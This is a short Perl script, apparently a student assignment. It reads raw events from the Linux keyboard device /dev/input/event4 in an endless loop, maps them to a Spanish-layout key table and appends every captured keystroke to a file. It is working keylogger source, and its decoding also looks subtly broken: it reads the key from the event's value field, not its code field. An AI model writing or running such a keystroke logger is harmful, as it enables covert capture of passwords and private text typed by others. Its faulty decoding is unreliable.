#!/usr/bin/perl
use warnings;
use strict;

if ($#ARGV != 0) {
	print "\nUsage: ./p10_jmartinez.pl file_output.txt \n";
	exit;
}

my $event = 'event4';
my $filename = "/dev/input/$event";
my $output_file = @ARGV[0];
my $entrada = "";
my $key = "";
my $flag = 0;

open(FH, '<:raw :bytes', $filename) or die $!;
my %input_event;
while (1) {
	my $bytes = read FH, my $content, 24;
	@input_event{ qw(v_sec tv_usec type code value) } = unpack "L!L!S!S!i!", $content;
	if ($input_event{"value"} > 2){
		$key = VirtualKey($input_event{"value"});
		open(OUT_FILE,'>>',$output_file) or die("Error\n");
		print OUT_FILE $key;
		close(OUT_FILE);
		$flag = 1;
	}
}
close(FH);

sub VirtualKey{
	my $index = $_[0];
	$index --;
   
	my @keys = ("ESC","1","2","3","4","5","6","7","8","9","0","?","¿","\nRET\n","\nTAB\n","Q","W","E","R","T","Y","U","I","O","P","´/¨","+/*","\nENTER\n","\nLCTRL\n","A","S","D","F","G","H","J","K","L","Ñ","{/[","|/°","LSHIFT","}/]","Z","X","C","V","B","N","M",",/;","./:","-/_","SHIFT","ALT","ALT"," ");
	
	if ($index < 130) {
		return $keys[$index]
	} else {
		return "\nindefinido\n";
	}
}